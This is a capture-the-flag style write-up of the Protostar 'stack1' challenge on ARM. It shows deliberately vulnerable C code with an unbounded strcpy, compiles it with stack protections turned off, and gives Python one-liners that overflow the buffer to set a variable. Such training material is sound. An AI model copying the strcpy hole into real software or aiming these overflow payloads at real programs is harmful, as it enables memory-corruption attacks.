## Protostar ARM ./stack1


#### Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
    errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
  } else {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

#### _Let's start_
This challenge is pretty similar to the challenge `stack0` except for:
* Data is passed via arguments instead of user input
* The value of the variable `modified`  has to be modified with a specific value `0x61626364`

Let's compile  
```c
gcc -g -fno-stack-protector -z execstack -no-pie -o stack1 stack1.c
```

We can use a similar workaround from the previous challenge but in this case, after that we fill the buffer variable with the `char A`, we will write as 65th byte the value checked in the if branch `0x61626364` (**_Little Endian_**).

```c
pi@raspberrypi:~/protostar/stack1 $ ./stack1 $(python -c "print 'A' * 64 + 'dcba'")
you have correctly got the variable to the right value
```
or...

```c
pi@raspberrypi:~/protostar/stack1 $ ./stack1 $(python -c "print 'A' * 64 + '\x64\x63\x62\x61'")
you have correctly got the variable to the right value
```
**_Done :)_**
